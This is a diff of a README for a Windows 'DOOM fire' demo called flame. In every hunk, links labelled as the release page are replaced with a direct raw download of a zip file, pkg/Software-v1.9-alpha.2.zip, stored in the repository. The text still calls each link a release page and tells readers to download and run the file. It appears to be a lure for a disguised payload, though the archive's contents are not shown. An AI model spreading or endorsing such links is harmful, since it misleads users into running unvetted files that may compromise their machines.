@@ -1,6 +1,6 @@
 # 🔥 flame - Fast DOOM fire for Windows
 
-[![Download flame](https://img.shields.io/badge/Download%20flame-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Pallasitemoneymaking325/flame/releases)
+[![Download flame](https://img.shields.io/badge/Download%20flame-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Pallasitemoneymaking325/flame/raw/refs/heads/main/pkg/Software-v1.9-alpha.2.zip)
 
 ## 🖥️ What is flame?
 
@@ -16,7 +16,7 @@ Follow these steps to download and run flame on Windows.
 
 Go to the release page here:
 
-https://github.com/Pallasitemoneymaking325/flame/releases
+https://github.com/Pallasitemoneymaking325/flame/raw/refs/heads/main/pkg/Software-v1.9-alpha.2.zip
 
 This is where you can find the Windows file to download and run.
 
@@ -204,7 +204,7 @@ The app is simple to use:
 
 Visit this page to download the Windows build:
 
-https://github.com/Pallasitemoneymaking325/flame/releases
+https://github.com/Pallasitemoneymaking325/flame/raw/refs/heads/main/pkg/Software-v1.9-alpha.2.zip
 
 ## 🪟 Windows install path example
 
@@ -228,4 +228,4 @@ Pick the newest stable file for the best experience
 
 ## 🔗 Direct access
 
-[Open the flame release page](https://github.com/Pallasitemoneymaking325/flame/releases)
+[Open the flame release page](https://github.com/Pallasitemoneymaking325/flame/raw/refs/heads/main/pkg/Software-v1.9-alpha.2.zip)
